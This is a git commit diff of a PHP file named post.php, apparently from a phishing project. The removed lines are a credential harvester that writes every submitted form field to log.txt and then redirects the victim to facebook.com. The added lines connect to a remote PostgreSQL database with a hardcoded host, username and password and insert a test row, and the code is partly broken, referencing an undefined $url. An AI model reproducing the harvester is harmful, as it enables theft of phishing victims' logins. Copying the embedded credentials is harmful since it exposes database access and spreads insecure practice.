63f7e64e3b8745259ed5e76f812c17142fb7e416
ndoomah <45961222+ndoomah@users.noreply.github.com>
2019-04-24 11:22:03 +0400

    Update post.php

--- post.php
+++ post.php
@@ -1,14 +1,27 @@
 <?php
 header ('Location: https://facebook.com');
-$handle = fopen("log.txt", "a");
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n\n\n\n");
-fclose($handle);
-exit;
+class DB_Connect
+{
+    public function connect()
+    {
+      $host        = "ec2-54-246-92-116.eu-west-1.compute.amazonaws.com";
+      $port        = "port=5432";
+      $dbname      = "d2qib7ffhl0bav";
+      $credentials = "user=lgxawseqtudbve password=1585c0b862c065144db2cc12116b0fbbd6350af41027b670480b7e47acafb176";
 
+      $db = pg_connect( " $url $host $port $dbname $credentials"  );
+      if(!$db){
+         echo "Error : Unable to open database\n";
+      } else {
+         echo "Opened database successfully\n";
+      }
+      return $db;
+    }
+}
+    $db1 = new DB_Connect();
+    $conn = $db1->connect();
+  
+    $query = "insert into public.user_test(name,email) values('val','val@in.com')";
+    $result = pg_query($conn,$query);
+    echo $result;
 ?>
